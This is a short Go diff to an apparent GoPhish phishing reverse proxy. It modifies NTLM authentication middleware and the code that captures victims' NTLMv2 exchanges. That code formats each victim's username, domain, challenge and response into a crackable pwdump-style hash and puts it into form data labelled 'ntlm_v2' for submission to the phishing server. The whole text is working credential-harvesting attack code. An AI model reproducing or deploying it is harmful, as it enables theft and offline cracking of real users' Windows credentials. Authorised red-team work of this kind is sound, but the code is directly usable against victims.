@@ -69,7 +69,9 @@ func RunGoPhishProxyHTTPCmd(host string, port string, dstUrl string, gophishUrl 
 		ntlmAuth.NtlmCapturedAuth = make(map[string]bool)
 		r.Handle("/{URL:.*}", negroni.New(
 			&logMiddleware{},
-			&ntlmAuth.NTLMAuthMiddleware{},
+			&ntlmAuth.NTLMAuthMiddlewareMux{
+				NTLMHandler: ntlmAuth.DefaultNTLMAuthMiddleWare,
+			},
 			negroni.WrapFunc(proxy.HandleFunc),
 		))
 
@@ -164,7 +166,7 @@ func (rp *GoPhishReverseProxy) HandleFunc(w http.ResponseWriter, r *http.Request
 			ntlmv2Response.Read(msg3.NTLMv2Response.RawData)
 			logger.Printf("%s", ntlmv2Response.ToString())
 
-			ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(ntlm.Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])
+			ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(ntlm.DefaultChallenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])
 
 			formData = url.Values{
 				"ntlm_v2": {ntlmv2_pwdump},
